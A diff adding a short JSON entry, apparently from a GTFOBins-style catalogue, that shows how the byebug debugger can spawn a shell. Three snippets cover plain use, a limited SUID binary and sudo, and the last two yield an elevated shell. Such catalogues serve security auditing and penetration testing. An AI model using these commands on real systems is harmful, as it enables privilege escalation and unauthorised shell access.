@@ -1,0 +1,19 @@
+{
+  "functions": {
+    "shell": [
+      {
+        "code": "TF=$(mktemp)\necho 'system(\"/bin/sh\")' > $TF\nbyebug $TF\ncontinue\n"
+      }
+    ],
+    "limited-suid": [
+      {
+        "code": "TF=$(mktemp)\necho 'system(\"/bin/sh\")' > $TF\n./byebug $TF\ncontinue\n"
+      }
+    ],
+    "sudo": [
+      {
+        "code": "TF=$(mktemp)\necho 'system(\"/bin/sh\")' > $TF\nsudo byebug $TF\ncontinue\n"
+      }
+    ]
+  }
+}
